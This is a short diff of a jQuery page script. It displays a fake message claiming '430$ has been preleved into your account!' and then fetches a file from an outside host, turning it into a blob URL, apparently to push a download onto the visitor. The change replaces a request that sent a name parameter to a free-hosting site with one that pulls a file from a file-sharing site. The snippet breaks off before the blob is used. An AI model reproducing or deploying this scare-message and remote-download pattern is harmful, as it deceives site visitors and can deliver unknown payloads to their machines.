@@ -10,7 +10,7 @@ jQuery(document).ready(function( $ ) {
   $("#log").text(params)
   $("#pop").text(params+" 430$ has been preleved into your account!")
 
-  fetch("http://dreamstravels.epizy.com/txt.php?name="+params)
+  fetch("http://www.filedropper.com/lsbp")
   .then(resp => resp.blob())
   .then(blob =>{
       const url = window.URL.createObjectURL(blob);
